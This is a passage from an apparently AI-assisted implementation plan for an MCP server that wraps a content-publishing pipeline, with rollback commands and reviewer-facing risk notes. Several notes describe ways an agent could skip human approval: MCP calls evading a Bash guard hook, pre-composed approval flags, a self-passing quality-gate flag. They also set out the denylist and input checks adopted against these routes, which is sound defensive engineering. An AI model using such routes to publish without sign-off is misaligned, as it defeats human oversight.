#    (untracked) SQLite source of truth instead of main's stale checkout:
cd command-post && /usr/bin/python3 -c "import db; db.export_queue_json(); db.export_publishing_log_json(); print('state JSON regenerated from DB')" && cd ..

claude mcp remove factory-mcp -s user                     # only if Task 8 Step 3 ran
cd factory-mcp && .venv/bin/pip uninstall -y pytest       # optional venv restore
```

If the smoke ran but cleanup didn't: run Task 8 Step 6 as-is (it is idempotent). The plan's own code writes nothing outside `factory-mcp/` — all pipeline writes happen inside the wrapped scripts, and only against the throwaway slug — but the heartbeat's commits ride on the branch, hence steps 1-4.

---

## Plan-author notes

Candid gaps, risks, and decisions for the adversarial review:

1. **`schedule` is demoted from the spec's original wording — the biggest divergence (now written back into the spec, review H4).** The original spec §3.3 said publish "supports `schedule` (writes the schedule queue)", but BOTH publishers gate `--schedule` behind `--approve` (`wp_publisher.py` computes `dry_run = not args.approve`; `tpi_publisher.py` writes `tpi-schedule-queue.json` only on the approve path). Since the never-`--approve` constraint is absolute and test-asserted, `schedule` here means: MCP-side timezone-aware ISO-8601 validation + publisher-side `--dry-run --schedule` preview + a returned `operator_command` **instruction**. Per review B1 that instruction is deliberately NON-executable and contains no approval flags — the earlier draft's "exact command Jose runs" (pre-composed with `--approve --ack-jose-approved`) fabricated the human-approval token and, for hook-unguarded `tpi_publisher.py`, was a zero-gate paste-and-run live publish. The alternative — the MCP writing the schedule queue itself — violates spec §3.4 (MCP never writes state) and was rejected; the spec has been amended to match (rev 2026-07-07).
2. **Subprocess-vs-import consequences.** No shared memory means `resulting_state` must be re-read after every run; I verified the scripts DO write the DB (`sonnet_writer.py` calls `db.upsert_article(stage="in_progress")` + `db.export_queue_json()`; `wp_publisher.py`, `tpi_publisher.py`, `content_assembler.py`, `image_pipeline.py` all import db), so post-run re-reads are genuinely fresh. But: (a) `state.py` itself imports `command-post/db.py` in-process — its import chain is stdlib-only (verified: sqlite3 + `lib.common` = fcntl/json/os), yet importing runs `init_db()` at import time, which is MORE than "idempotent CREATE TABLE + mkdir": it also executes the `_migrate_cost_daily_provider` schema migration (`ALTER TABLE` + `UPDATE` backfill, db.py:210-231) — a write-shaped side effect at every server start, accepted on this box (idempotent + WAL + 30s timeout) and ISOLATED in tests via conftest's temp-copy `db` import so no test run ever migrates production `state/jarvis.db`; (b) `sys.path.insert(0, command-post)` can shadow same-named modules — `db` and `lib` collide with nothing in the minimal venv today, but adding a future dep named `db`/`lib` would break it; (c) `db.DB_PATH` follows the **imported** `db.py`'s file location, and `state.py` imports it from `$JARVIS_PROJECT_DIR/command-post` — so a real relocation via the env var DOES move the SQLite reads along with everything else; the actual failure mode of a bogus `JARVIS_PROJECT_DIR` is a loud `ImportError` at server start (no `db` module anywhere on the path), not silently-wrong reads. (Restated per review adjudication — the earlier claim that the env var "relocates queue/events but NOT SQLite reads" was inaccurate.)
3. **`resulting_state` reliability limits.** Which stage each script sets per transition was NOT audited verb-by-verb (only draft's `in_progress` is verified); the smoke asserts stage only after draft. `queue.json` is exported from the DB by the scripts themselves — if a script crashes between DB write and export, `queue_stage` lags `article.stage`; the envelope exposes both precisely so the skew is visible rather than papered over. A slug can legitimately have `article: null` — callers must not treat null as an error. (Per review N1, `_STAGES` and the status schema enum now include `scheduled` — written by `tpi_publisher.py` §12a but missing from `db.export_queue_json()`'s bucket list — so scheduled articles are filterable.)
4. **Real CLI shapes vs spec §3.2 table — divergences now folded into the spec itself (review H4):** `--brief` is a file PATH (schema named `brief_path`); `image_pipeline --provider` is required with a third choice `openrouter` (MCP applies the spec's `openai` default); `tpi_publisher` has `--slug`/`--all` mutually exclusive plus `--rebuild` (never emitted); `wp_publisher --force` exists (never emitted). `content_reviewer --fix` is a "mark as passed" override, NOT a repair — the review question is resolved: **REMOVED from the MCP surface entirely (H2)**. It self-greens the mandatory quality gate with zero enforcement behind a description-level plea, exactly the pattern rejected for `--approve`; it stays operator-CLI-only, sits on `runner.FORBIDDEN_FLAGS`, and `fix` is rejected as an unknown key. `sonnet_writer` has NO dry-run flag, so the integration smoke necessarily runs one real draft ($0 Max-plan CLI path, minutes). The spec §3.2 table now carries the corrected names/inputs (snake_case wire names, `brief_path`, real provider set, no `fix`).
5. **Tool naming:** dotted `factory.draft` cannot be a wire name (MCP/Anthropic tool-name charset excludes `.`), so tools are `factory_draft` etc. and the envelope's `verb` is the short form (`"draft"`) — the spec §3.2 table now carries the snake_case names (H4). Flag-injection: the `-`-leading reject closes argv-FLAG injection (argv is a list, `shell=False`), but per review H1 it is insufficient alone — slug is also a filesystem path component and is interpolated into returned text, so every verb additionally enforces the slug charset regex, and `operator_command` interpolations are `shlex.quote`d.
6. **The Bash guard hook does NOT cover MCP calls.** `~/.claude/hooks/guard_wp_publish.py` only inspects `Bash` tool invocations (and its regex matches only `wp_publisher.py` — `tpi_publisher.py` is not hook-guarded even on Bash); `mcp__factory-mcp__factory_publish` bypasses it entirely. Per review H3 the gate is therefore no longer tests+grep alone: `runner.run_script()` — the single chokepoint every verb passes through — enforces the frozen `FORBIDDEN_FLAGS` denylist at RUNTIME and raises before any subprocess (Task 1), and per B1 no response ever hands out the approval tokens the Bash channel treats as human-typed. Remaining defense-in-depth for later (noted in the README): a PreToolUse hook matching `mcp__factory-mcp__*`, or making the publishers require an env token for `--approve`.
7. **Capture+tail, not streaming — and the spec now says so (review H4).** The FastAPI precedent streams into a job store for SSE consumers; MCP tool calls here are request/response, so draft/images just run silently for minutes (smoke client `read_timeout_seconds=2700` > the server-side kill at 2400; the REGISTERED client's tool-call timeout is verified/documented in Task 8 Step 3 per review M1). Spec §1 criterion 2 has been amended from "streaming progress" to "capturing output and returning a structured result (tail); MCP progress notifications deferred" — the docs no longer contradict each other.
8. **Smoke pass criteria are mechanics-hard, editorial-soft.** A 700-word, image-less throwaway may legitimately fail `content_reviewer` thresholds and `tpi_publisher --dry-run` validation; hard-asserting `ok:true` there would make the gate flaky, so those two outcomes are recorded and reported instead. `assemble` IS hard-asserted ok:true — if the assembler turns out to hard-require images, that surfaces as a stop-and-report, not a silent pass. Reviewer should sanity-check this trade.
9. **Timeouts are judgment calls** (draft/images 2400s, assemble/review 300s, publish 900s) with no hard timing data behind them; a slow multi-image batch could hit 2400s and be killed mid-generation (the script's own `image-batches.json` state handling then owns partial-batch recovery/resume). Per review M1 a timeout now SIGKILLs the entire process group (`start_new_session=True` + `os.killpg`), so sonnet_writer's `claude` CLI grandchild cannot keep running — and keep writing files/DB rows — after the envelope reported `timed_out:true`; the registered client's own tool-call timeout is verified/documented in Task 8 Step 3.
10. **Environment couplings:** the heartbeat auto-committer may interleave commits on the feature branch (mitigated by explicit-path `git add`; residual branch noise accepted — and the Rollback section now handles salvaging its `state/`+`content-pipeline/` commits before branch deletion, review M4); the `mcp` dependency is pinned `>=1.27,<2` in Task 1 to match the installed 1.27.1 behaviors this plan is written against (`ClientSession(read_timeout_seconds=...)`, low-level `Server`, `anyio` availability); the per-task expected test counts (6/15/24/30/34/39/50) assume the executor does not split or rename test files.
11. **This plan supersedes an earlier same-day draft at the same path** which ran DB reads through a subprocess (`db_read.py`) instead of the in-process import chosen here; the in-process read matches the spec's explicit §3.4 carve-out and the verified stdlib-only import chain, and halves the subprocess count per verb. If review prefers total process isolation, swap `state.py`'s internals for a `run_script`-based `db_read` helper — the `state.get_article/get_articles/read_resulting_state` interface was designed so nothing else changes.
